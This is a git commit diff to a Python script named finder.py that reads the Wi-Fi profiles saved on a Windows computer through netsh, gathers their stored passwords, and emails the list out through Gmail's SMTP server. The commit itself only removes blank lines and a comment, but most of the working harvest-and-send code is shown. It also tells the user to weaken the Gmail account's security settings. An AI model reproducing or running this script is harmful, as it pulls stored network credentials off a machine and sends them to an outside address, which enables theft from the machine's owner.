85253a5b21355653ffe8013d529469cc8c4b52ef
Pritam Pawar <65030567+pritamp17@users.noreply.github.com>
2021-02-28 17:36:50 +0530

    Update finder.py

--- Python/Get-Wifi-Password/finder.py
+++ Python/Get-Wifi-Password/finder.py
@@ -2,17 +2,14 @@ import subprocess
 import smtplib
 
 def send_mail(email,password,message):
-    
 	server = smtplib.SMTP("smtp.gmail.com",587)
 	server.starttls()
 	server.login(email,password)
 	server.sendmail(email,email,message)
 	server.quit()
-
 email=input("[+] Enter Email on which you want to recieve WIFI passwords: ")
 print("[-] please enable -less secured apps-  to recieve an email")
 password = input("[+] Enter Password : ")
-
 listi = []
 data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
 profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
@@ -23,11 +20,9 @@ for i in profiles:
         listi.append(("{:<30}|  {:<}".format(i, results[0])))
     except IndexError:
       listi.append("{:<30}|  {:<}".format(i, ""))
-
 res=""
 for msg in listi:
     res = res + msg +"\n"
-# print(res)
 try:
     send_mail(email, password, res)
     print("[+] email successfully sent\n")
